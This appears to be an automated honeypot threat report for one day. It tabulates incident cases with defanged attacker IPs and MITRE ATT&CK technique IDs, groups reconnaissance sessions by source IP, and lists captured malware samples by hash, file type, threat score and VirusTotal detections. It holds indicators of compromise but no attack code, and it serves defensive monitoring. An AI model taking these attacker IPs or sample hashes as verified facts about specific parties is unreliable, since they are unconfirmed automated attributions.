| IR-ec6dc0d0253f | HIGH | `185.2.228[.]48` | 2026-10-06 06:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aef11fba8ce1 | HIGH | `193.32.162[.]84` | 2026-10-06 06:53 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-62010566fad6 | HIGH | `187.8.3[.]230` | 2026-10-06 06:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-85096ae71e42 | HIGH | `75.64.135[.]45` | 2026-10-06 06:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-343146089ecc | HIGH | `69.124.69[.]20` | 2026-10-06 06:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-89fae92eb4d3 | HIGH | `78.66.45[.]101` | 2026-10-06 06:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0327c58f762b | HIGH | `72.215.44[.]72` | 2026-10-06 07:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5cab470e3ab6 | HIGH | `34.53.176[.]236` | 2026-10-06 07:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b1d007e64210 | HIGH | `45.33.50[.]24` | 2026-10-06 07:05 | Y | 0 | 0 | `T1078` |
| IR-afd4925ec4ce | HIGH | `45.33.50[.]24` | 2026-10-06 07:07 | Y | 8 | 0 | `T1078` |
| IR-2eda3927530d | HIGH | `181.49.8[.]57` | 2026-10-06 07:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-aa1c5a7a5922 | HIGH | `111.70.23[.]254` | 2026-10-06 07:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6057fb5cca62 | HIGH | `181.49.8[.]57` | 2026-10-06 07:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-324c9e971322 | HIGH | `102.211.7[.]162` | 2026-10-06 07:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-79b692bd22af | HIGH | `152.32.199[.]115` | 2026-10-06 07:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f6dda29124a3 | HIGH | `152.32.199[.]115` | 2026-10-06 07:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2030d9b055f2 | HIGH | `117.250.19[.]91` | 2026-10-06 07:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7930d541f13e | HIGH | `181.129.31[.]42` | 2026-10-06 07:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a48370f00b5f | HIGH | `109.160.32[.]117` | 2026-10-06 07:22 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9e2093fc37d5 | HIGH | `36.138.78[.]195` | 2026-10-06 07:23 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-510d18460716 | HIGH | `36.141.93[.]74` | 2026-10-06 07:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fe4aaeae8655 | HIGH | `36.141.93[.]74` | 2026-10-06 07:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-37feac124293 | HIGH | `118.196.86[.]3` | 2026-10-06 07:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-403ddd5f73ae | HIGH | `118.196.86[.]3` | 2026-10-06 07:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-193bf21365d3 | HIGH | `14.103.117[.]81` | 2026-10-06 07:30 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-73a3b92dc476 | HIGH | `117.70.94[.]155` | 2026-10-06 07:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b5089044d68c | HIGH | `83.226.181[.]38` | 2026-10-06 07:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dd0c6b104957 | HIGH | `65.20.251[.]170` | 2026-10-06 07:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8e55c8ea19f2 | HIGH | `109.160.32[.]162` | 2026-10-06 07:53 | Y | 1 | 0 | `T1078 · T1592` |
_… 154 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.160.32[.]157` | **2** | 2026-10-06 09:53 | 2026-10-06 10:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-10-06 06:11 | 2026-10-06 08:01 | 1m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-10-06 13:31 | 2026-10-06 14:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | **2** | 2026-10-06 03:08 | 2026-10-06 04:21 | 1m | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | **2** | 2026-10-06 09:24 | 2026-10-06 10:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.76.243[.]197` | **2** | 2026-10-06 04:58 | 2026-10-06 06:05 | 4m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-10-06 10:44 | 2026-10-06 12:05 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `34.46.96[.]79` | **2** | 2026-10-06 03:21 | 2026-10-06 04:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | **2** | 2026-10-06 07:38 | 2026-10-06 09:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `59.36.72[.]234` | **2** | 2026-10-06 03:38 | 2026-10-06 04:13 | 4m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-10-06 03:57 | 2026-10-06 04:19 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.205.238[.]29` | 1 | 2026-10-06 09:34 | 2026-10-06 09:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.2.88[.]64` | 1 | 2026-10-06 06:10 | 2026-10-06 06:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.44.24[.]83` | 1 | 2026-10-06 04:53 | 2026-10-06 04:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.75.226[.]5` | 1 | 2026-10-06 04:05 | 2026-10-06 04:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]103` | 1 | 2026-10-06 11:05 | 2026-10-06 11:05 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]116` | 1 | 2026-10-06 05:29 | 2026-10-06 05:29 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]117` | 1 | 2026-10-06 07:22 | 2026-10-06 07:22 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]128` | 1 | 2026-10-06 03:27 | 2026-10-06 03:27 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]162` | 1 | 2026-10-06 07:53 | 2026-10-06 07:53 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]47` | 1 | 2026-10-06 11:24 | 2026-10-06 11:24 | 8s | 0 | `T1592` | 🟢 LOW |
| `112.64.169[.]110` | 1 | 2026-10-06 12:59 | 2026-10-06 13:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.188[.]201` | 1 | 2026-10-06 09:52 | 2026-10-06 09:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.26.16[.]186` | 1 | 2026-10-06 08:57 | 2026-10-06 08:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.148[.]35` | 1 | 2026-10-06 14:14 | 2026-10-06 14:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.170[.]74` | 1 | 2026-10-06 15:18 | 2026-10-06 15:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.60[.]18` | 1 | 2026-10-06 14:57 | 2026-10-06 14:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.71.11[.]120` | 1 | 2026-10-06 11:30 | 2026-10-06 11:30 | 1s | 0 | `T1592` | 🟢 LOW |
| `123.187.244[.]19` | 1 | 2026-10-06 13:09 | 2026-10-06 13:10 | 99s | 0 | `T1592` | 🟢 LOW |
| `123.6.229[.]172` | 1 | 2026-10-06 16:30 | 2026-10-06 16:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.39.148[.]106` | 1 | 2026-10-06 05:32 | 2026-10-06 05:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.1.132[.]17` | 1 | 2026-10-06 14:26 | 2026-10-06 14:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-06 03:03 | 2026-10-06 03:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-06 07:04 | 2026-10-06 07:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-06 12:20 | 2026-10-06 12:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-06 14:48 | 2026-10-06 14:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-06 03:29 | 2026-10-06 03:30 | 47s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-06 10:23 | 2026-10-06 10:24 | 55s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-06 04:22 | 2026-10-06 04:22 | 44s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]81` | 1 | 2026-10-06 07:30 | 2026-10-06 07:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.90[.]3` | 1 | 2026-10-06 09:54 | 2026-10-06 09:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.170[.]54` | 1 | 2026-10-06 06:12 | 2026-10-06 06:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.139.201[.]247` | 1 | 2026-10-06 13:07 | 2026-10-06 13:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.237.43[.]105` | 1 | 2026-10-06 14:00 | 2026-10-06 14:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `154.73.130[.]42` | 1 | 2026-10-06 10:35 | 2026-10-06 10:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `162.255.112[.]183` | 1 | 2026-10-06 11:47 | 2026-10-06 11:48 | 10s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-10-06 06:33 | 2026-10-06 06:34 | 86s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-10-06 14:26 | 2026-10-06 14:27 | 12s | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]46` | 1 | 2026-10-06 13:34 | 2026-10-06 13:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]193` | 1 | 2026-10-06 07:09 | 2026-10-06 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.239.64[.]155` | 1 | 2026-10-06 10:16 | 2026-10-06 10:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-10-06 12:34 | 2026-10-06 12:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.138.39[.]145` | 1 | 2026-10-06 16:42 | 2026-10-06 16:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.161.220[.]200` | 1 | 2026-10-06 05:33 | 2026-10-06 05:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-06 12:31 | 2026-10-06 12:32 | 31s | 0 | `T1592` | 🟢 LOW |
| `179.63.53[.]164` | 1 | 2026-10-06 04:05 | 2026-10-06 04:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-10-06 16:36 | 2026-10-06 16:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.106.80[.]16` | 1 | 2026-10-06 03:39 | 2026-10-06 03:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.92.202[.]149` | 1 | 2026-10-06 08:15 | 2026-10-06 08:15 | 1s | 0 | `T1592` | 🟢 LOW |
| `185.191.236[.]38` | 1 | 2026-10-06 10:19 | 2026-10-06 10:19 | 1s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]16` | 1 | 2026-10-06 08:00 | 2026-10-06 08:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-10-06 06:03 | 2026-10-06 06:03 | 10s | 0 | `T1592` | 🟢 LOW |
| `186.158.236[.]74` | 1 | 2026-10-06 10:54 | 2026-10-06 10:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.158.30[.]248` | 1 | 2026-10-06 07:32 | 2026-10-06 07:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `187.180.70[.]140` | 1 | 2026-10-06 05:59 | 2026-10-06 05:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]220` | 1 | 2026-10-06 09:34 | 2026-10-06 09:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-06 12:56 | 2026-10-06 12:57 | 31s | 0 | `T1592` | 🟢 LOW |
| `193.124.20[.]246` | 1 | 2026-10-06 08:00 | 2026-10-06 08:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]148` | 1 | 2026-10-06 15:58 | 2026-10-06 15:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-10-06 06:39 | 2026-10-06 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-10-06 07:02 | 2026-10-06 07:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.226.49[.]237` | 1 | 2026-10-06 03:35 | 2026-10-06 03:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]121` | 1 | 2026-10-06 15:58 | 2026-10-06 15:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.133.156[.]133` | 1 | 2026-10-06 05:43 | 2026-10-06 05:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]33` | 1 | 2026-10-06 06:49 | 2026-10-06 06:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.169.85[.]0` | 1 | 2026-10-06 07:43 | 2026-10-06 07:43 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.29.18[.]118` | 1 | 2026-10-06 14:18 | 2026-10-06 14:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.98.132[.]216` | 1 | 2026-10-06 05:57 | 2026-10-06 05:57 | 9s | 0 | `T1592` | 🟢 LOW |
| `200.59.122[.]4` | 1 | 2026-10-06 04:59 | 2026-10-06 05:00 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.59.88[.]196` | 1 | 2026-10-06 06:05 | 2026-10-06 06:05 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.81.166[.]100` | 1 | 2026-10-06 14:06 | 2026-10-06 14:06 | 11s | 0 | `T1592` | 🟢 LOW |
| `200.81.188[.]230` | 1 | 2026-10-06 10:04 | 2026-10-06 10:05 | 10s | 0 | `T1592` | 🟢 LOW |
| `206.183.111[.]36` | 1 | 2026-10-06 09:36 | 2026-10-06 09:36 | 3s | 0 | `T1592` | 🟢 LOW |
| `209.15.179[.]191` | 1 | 2026-10-06 09:24 | 2026-10-06 09:24 | 15s | 0 | `T1592` | 🟢 LOW |
| `216.244.214[.]148` | 1 | 2026-10-06 13:05 | 2026-10-06 13:06 | 11s | 0 | `T1592` | 🟢 LOW |
| `24.97.253[.]246` | 1 | 2026-10-06 10:28 | 2026-10-06 10:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-10-06 15:03 | 2026-10-06 15:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.52.207[.]139` | 1 | 2026-10-06 05:19 | 2026-10-06 05:20 | 5s | 0 | `T1592` | 🟢 LOW |
| `34.53.176[.]236` | 1 | 2026-10-06 07:04 | 2026-10-06 07:04 | 4s | 0 | `T1592` | 🟢 LOW |
| `34.62.194[.]208` | 1 | 2026-10-06 06:10 | 2026-10-06 06:10 | 4s | 0 | `T1592` | 🟢 LOW |
| `34.62.241[.]134` | 1 | 2026-10-06 07:05 | 2026-10-06 07:05 | 6s | 0 | `T1592` | 🟢 LOW |
| `35.233.35[.]44` | 1 | 2026-10-06 04:42 | 2026-10-06 04:42 | 7s | 0 | `T1592` | 🟢 LOW |
| `36.136.104[.]18` | 1 | 2026-10-06 13:10 | 2026-10-06 13:10 | 2s | 0 | `T1592` | 🟢 LOW |
| `36.26.74[.]162` | 1 | 2026-10-06 07:10 | 2026-10-06 07:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]111` | 1 | 2026-10-06 14:07 | 2026-10-06 14:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.235.209[.]138` | 1 | 2026-10-06 12:32 | 2026-10-06 12:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-10-06 08:35 | 2026-10-06 08:35 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-10-06 13:33 | 2026-10-06 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-10-06 09:33 | 2026-10-06 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-10-06 14:36 | 2026-10-06 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.50[.]24` | 1 | 2026-10-06 07:08 | 2026-10-06 07:08 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]223` | 1 | 2026-10-06 15:34 | 2026-10-06 15:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-10-06 13:33 | 2026-10-06 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-10-06 15:33 | 2026-10-06 15:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.216.59[.]225` | 1 | 2026-10-06 10:10 | 2026-10-06 10:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.116.174[.]191` | 1 | 2026-10-06 06:54 | 2026-10-06 06:54 | 10s | 0 | `T1592` | 🟢 LOW |
| `49.115.217[.]146` | 1 | 2026-10-06 16:30 | 2026-10-06 16:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]50` | 1 | 2026-10-06 16:34 | 2026-10-06 16:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]11` | 1 | 2026-10-06 13:03 | 2026-10-06 13:04 | 6s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]21` | 1 | 2026-10-06 07:21 | 2026-10-06 07:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.159[.]194` | 1 | 2026-10-06 15:30 | 2026-10-06 15:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.245.72[.]233` | 1 | 2026-10-06 11:39 | 2026-10-06 11:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.64.169[.]153` | 1 | 2026-10-06 06:16 | 2026-10-06 06:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.64.85[.]138` | 1 | 2026-10-06 13:34 | 2026-10-06 13:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `52.180.153[.]168` | 1 | 2026-10-06 04:55 | 2026-10-06 04:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.209.234[.]84` | 1 | 2026-10-06 11:07 | 2026-10-06 11:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.42.8[.]7` | 1 | 2026-10-06 14:39 | 2026-10-06 14:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-10-06 16:02 | 2026-10-06 16:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.226.64[.]124` | 1 | 2026-10-06 05:14 | 2026-10-06 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]137` | 1 | 2026-10-06 03:02 | 2026-10-06 03:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-10-06 06:44 | 2026-10-06 06:44 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]9` | 1 | 2026-10-06 03:24 | 2026-10-06 03:24 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]184` | 1 | 2026-10-06 06:51 | 2026-10-06 06:51 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]193` | 1 | 2026-10-06 11:53 | 2026-10-06 11:53 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]204` | 1 | 2026-10-06 16:47 | 2026-10-06 16:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]35` | 1 | 2026-10-06 06:52 | 2026-10-06 06:53 | 20s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]45` | 1 | 2026-10-06 03:45 | 2026-10-06 03:46 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]160` | 1 | 2026-10-06 06:53 | 2026-10-06 06:53 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]168` | 1 | 2026-10-06 16:54 | 2026-10-06 16:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]126` | 1 | 2026-10-06 06:50 | 2026-10-06 06:50 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]77` | 1 | 2026-10-06 03:49 | 2026-10-06 03:49 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]91` | 1 | 2026-10-06 06:51 | 2026-10-06 06:51 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]91` | 1 | 2026-10-06 06:52 | 2026-10-06 06:52 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.240.192[.]82` | 1 | 2026-10-06 04:57 | 2026-10-06 04:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `68.41.27[.]167` | 1 | 2026-10-06 15:14 | 2026-10-06 15:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-10-06 10:33 | 2026-10-06 10:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.191.90[.]243` | 1 | 2026-10-06 03:47 | 2026-10-06 03:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.192.12[.]134` | 1 | 2026-10-06 07:04 | 2026-10-06 07:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]185` | 1 | 2026-10-06 09:18 | 2026-10-06 09:18 | 3s | 0 | `T1592` | 🟢 LOW |
| `73.246.154[.]213` | 1 | 2026-10-06 06:52 | 2026-10-06 06:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `76.33.238[.]214` | 1 | 2026-10-06 03:45 | 2026-10-06 03:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.21.41[.]206` | 1 | 2026-10-06 06:19 | 2026-10-06 06:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-06 08:52 | 2026-10-06 08:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-06 12:21 | 2026-10-06 12:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]45` | 1 | 2026-10-06 06:22 | 2026-10-06 06:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]66` | 1 | 2026-10-06 04:28 | 2026-10-06 04:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.138.209[.]192` | 1 | 2026-10-06 14:24 | 2026-10-06 14:24 | 4s | 0 | `T1592` | 🟢 LOW |
| `8.148.75[.]14` | 1 | 2026-10-06 13:12 | 2026-10-06 13:12 | 3s | 0 | `T1592` | 🟢 LOW |
| `80.66.83[.]43` | 1 | 2026-10-06 07:38 | 2026-10-06 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `82.102.188[.]117` | 1 | 2026-10-06 08:34 | 2026-10-06 08:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]9` | 1 | 2026-10-06 09:58 | 2026-10-06 09:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.239.151[.]54` | 1 | 2026-10-06 09:10 | 2026-10-06 09:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.211.133[.]99` | 1 | 2026-10-06 04:25 | 2026-10-06 04:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-10-06 16:43 | 2026-10-06 16:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-06 06:12 | 2026-10-06 06:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-06 08:21 | 2026-10-06 08:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-06 14:16 | 2026-10-06 14:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-06 16:24 | 2026-10-06 16:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.131.219[.]236` | 1 | 2026-10-06 08:57 | 2026-10-06 08:58 | 13s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]196` | 1 | 2026-10-06 10:52 | 2026-10-06 10:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]196` | 1 | 2026-10-06 16:08 | 2026-10-06 16:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `98.53.146[.]62` | 1 | 2026-10-06 04:34 | 2026-10-06 04:34 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
